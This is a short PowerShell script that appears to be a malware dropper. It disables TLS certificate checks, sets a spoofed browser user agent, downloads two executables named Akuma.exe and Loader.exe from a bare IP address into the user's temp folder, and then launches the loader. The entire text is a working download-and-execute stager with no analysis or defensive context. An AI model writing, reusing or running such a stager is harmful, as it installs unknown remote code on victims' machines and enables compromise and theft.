[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")

$wc.DownloadFile("https://31.57.201.118:8443/api/DownloadFile?path=C:\Users\Administrator\Desktop\H3h_2fef\Akuma.exe", "$env:TEMP\Akuma.exe")
$wc.DownloadFile("https://31.57.201.118:8443/api/DownloadFile?path=C:\Users\Administrator\Desktop\H3h_2fef\Loader.exe", "$env:TEMP\Loader.exe")

Start-Process "$env:TEMP\Loader.exe"